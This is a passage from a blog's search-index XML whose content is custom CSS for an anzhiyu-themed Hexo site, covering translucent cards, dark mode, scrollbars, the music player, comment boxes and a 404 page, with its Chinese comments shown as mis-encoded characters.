var(--anzhiyu-theme);    color: var(--anzhiyu-ahoverbg);    border-radius: 10px;  }  a.bangumi-tab:hover {    text-decoration: none !important;  }  .bangumi-button:hover {    background: var(--anzhiyu-theme) !important;    border-radius: 10px !important;    color: var(--anzhiyu-ahoverbg) !important;  }  a.bangumi-button.bangumi-nextpage:hover {    text-decoration: none !important;  }  .bangumi-button {    padding: 5px 10px !important;  }    a.bangumi-tab {    padding: 5px 10px !important;  }  svg.icon.faa-tada {    font-size: 1.1em;  }  .bangumi-info-item {    border-right: 1px solid #f2b94b;  }  .bangumi-info-item span {    color: #f2b94b;  }  .bangumi-info-item em {    color: #f2b94b;  }    /* è§£å†³artitalkçš„å›¾æ ‡é—®é¢˜ */  #uploadSource > svg {    width: 1.19em;    height: 1.5em;  }    /*top-imgé»‘è‰²é€æ˜ç»ç’ƒæ•ˆæœç§»é™¤ï¼Œä¸å»ºè®®åŠ ï¼Œé™¤éä½ æ‰§ç€äºå®Œå…¨ä¸€å›¾æµæˆ–è€…èƒŒæ™¯å›¾å¯¹æ¯”è‰²æ˜æ˜¾ */  #page-header:not(.not-top-img):before {    background-color: transparent !important;  }    /* é¦–é¡µæ–‡ç« å¡ç‰‡ */  #recent-posts > .recent-post-item {    background: rgba(255, 255, 255, 0.9);  }    /* é¦–é¡µä¾§æ å¡ç‰‡ */  #aside-content .card-widget {    background: rgba(255, 255, 255, 0.9);  }    /* æ–‡ç« é¡µé¢æ­£æ–‡èƒŒæ™¯ */  div#post {    background: rgba(255, 255, 255, 0.9);  }    /* åˆ†é¡µé¡µé¢ */  div#page {    background: rgba(255, 255, 255, 0.9);  }    /* å½’æ¡£é¡µé¢ */  div#archive {    background: rgba(255, 255, 255, 0.9);  }    /* æ ‡ç­¾é¡µé¢ */  div#tag {    background: rgba(255, 255, 255, 0.9);  }    /* åˆ†ç±»é¡µé¢ */  div#category {    background: rgba(255, 255, 255, 0.9);  }    /*å¤œé—´æ¨¡å¼ä¼ªç±»é®ç½©å±‚é€æ˜*/  [data-theme="dark"] #recent-posts > .recent-post-item {    background: #121212;  }    [data-theme="dark"] .card-widget {    background: #121212 !important;  }    [data-theme="dark"] div#post {    background: #121212 !important;  }    [data-theme="dark"] div#tag {    background: #121212 !important;  }    [data-theme="dark"] div#archive {    background: #121212 !important;  }    [data-theme="dark"] div#page {    background: #121212 !important;  }    [data-theme="dark"] div#category {    background: #121212 !important;  }    [data-theme="dark"] div#category {    background: transparent !important;  }    /* é¡µè„šé€æ˜ */  #footer {    background: transparent !important;  }    /* å¤´å›¾é€æ˜ */  #page-header {    background: transparent !important;  }    #rightside > div > button {    border-radius: 5px;  }    /* æ»šåŠ¨æ¡ */    ::-webkit-scrollbar {    width: 10px;    height: 10px;  }    ::-webkit-scrollbar-thumb {    background-color: #3b70fc;    border-radius: 2em;  }    ::-webkit-scrollbar-corner {    background-color: transparent;  }    ::-moz-selection {    color: #fff;    background-color: #3b70fc;  }    /* éŸ³ä¹æ’­æ”¾å™¨ */    /* .aplayer .aplayer-lrc {    display: none !important;  } */    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {    left: -66px !important;    transition: all 0.3s;    /* é»˜è®¤æƒ…å†µä¸‹ç¼©è¿›å·¦ä¾§66pxï¼Œåªç•™ä¸€ç‚¹ç®­å¤´éƒ¨åˆ† */  }    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {    left: 0 !important;    transition: all 0.3s;    /* é¼ æ ‡æ‚¬åœæ˜¯å·¦ä¾§ç¼©è¿›å½’é›¶ï¼Œå®Œå…¨æ˜¾ç¤ºæŒ‰é’® */  }    .aplayer.aplayer-fixed {    z-index: 999999 !important;  }    /* è¯„è®ºæ¡†  */  .vwrap {    box-shadow: 2px 2px 5px #bbb;    background: rgba(255, 255, 255, 0.3);    border-radius: 8px;    padding: 30px;    margin: 30px 0px 30px 0px;  }    /* è®¾ç½®è¯„è®ºæ¡† */    .vcard {    box-shadow: 2px 2px 5px #bbb;    background: rgba(255, 255, 255, 0.3);    border-radius: 8px;    padding: 30px;    margin: 30px 0px 0px 0px;  }    /* mdç½‘ç«™ä¸‹åˆ’çº¿ */  #article-container a:hover {    text-decoration: none !important;  }    #article-container #hpp_talk p img {    display: inline;  }    /* 404é¡µé¢ */  #error-wrap {    position: absolute;    top: 40%;    right: 0;    left: 0;    margin: 0 auto;    padding: 0 1rem;    max-width: 1000px;    transform: translate(0, -50%);  }    #error-wrap .error-content {    display: flex;    flex-direction: row;    justify-content: center;    align-items: center;    margin: 0 1rem;    height: 18rem;    border-radius: 8px;    background: var(--card-bg);    box-shadow: var(--card-box-shadow);    transition: all 0.3s;  }    #error-wrap .error-content .error-img {    box-flex: 1;    flex: 1;    height: 100%;    border-top-left-radius: 8px;    border-bottom-left-radius: 8px;    background-color: #3b70fc;    background-position: center;    background-size: cover;  }    #error-wrap .error-content .error-info {    box-flex: 1;    flex: 1;    padding: 0.5rem;    text-align: center;    font-size: 14px;    font-family: Titillium Web, "PingFang SC", "Hiragino Sans GB", "Microsoft JhengHei", "Microsoft YaHei", sans-serif;  }  #error-wrap .error-content .error-info .error_title {    margin-top: -4rem;    font-size: 9em;  }  #error-wrap .error-content .error-info .error_subtitle {    margin-top: -3.5rem;    word-break: break-word;    font-size: 1.6em;  }  #error-wrap .error-content .error-info a {    display: inline-block;    margin-top: 0.5rem;    padding: 0.3rem 1.5rem;    background: var(--btn-bg);    color: var(--btn-color);  }    #body-wrap.error .aside-list {    display: flex;    flex-direction: row;    flex-wrap: nowrap;    bottom: 0px;    position: absolute;    padding: 1rem;    width: 100%;    overflow: scroll;  }    #body-wrap.error .aside-list .aside-list-group {    display: flex;    flex-direction: row;    flex-wrap: nowrap;    max-width: 1200px;    margin: 0 auto;  }    #body-wrap.error .aside-list .aside-list-item {    padding: 0.5rem;  }    #body-wrap.error .aside-list .aside-list-item img {    width: 100%;    -o-object-fit: cover;       object-fit: cover;    border-radius: 12px;  }    #body-wrap.error .aside-list .aside-list-item .thumbnail {    overflow: hidden;    width: 230px;    height: 143px;    background: var(--anzhiyu-card-bg);    display: flex;  }    #body-wrap.error .aside-list .aside-list-item .content .title {    -webkit-line-clamp: 2;    overflow: hidden;    display: -webkit-box;    -webkit-box-orient: vertical;    line-height: 1.5;    justify-content: center;    align-items: flex-end;    align-content: center;    padding-top: 0.5rem;    color: white;  }    #body-wrap.error .aside-list .aside-list-item .content time {    display: none;  }    /* ä»£ç æ¡†ä¸»é¢˜ */  #article-container figure.highlight {    border-radius: 10px;  }  ]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
